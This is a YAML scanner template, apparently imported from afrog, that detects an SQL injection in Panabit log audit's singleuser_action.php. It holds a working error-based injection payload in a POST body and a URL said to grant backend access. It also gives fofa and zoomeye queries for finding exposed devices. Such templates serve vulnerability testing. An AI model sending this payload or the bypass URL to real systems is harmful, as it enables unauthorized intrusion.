# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      {
          "syncInfo": {
              "operationType": "ADD_USER",
              "user": {
                  "userId": "a' || updatexml(1,concat(0x7e,(select @@version),0x7e),1)and '1'='1%23",
                  "userPwd": "a"
              }
          }
      }
    headers:
      Content-Type: application/json
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - XPATH syntax error
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/singleuser_action.php'
id: panabit-singleuser-action-sqli
info:
  author: zan8in
  description: |-
    panabit日志审计存在 singleuser_action.php SQL注入漏洞
    访问 https://x.x.x.x/singlelogin.php?userId=26062 即可进入后台

    fofa: app="Panabit-Panalog"
    zoomeye: app:"Panabit-Panalog"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: panabit日志审计 singleuser_action.php SQL注入漏洞
  severity: high
  tags: panabit,sqli,argus-import
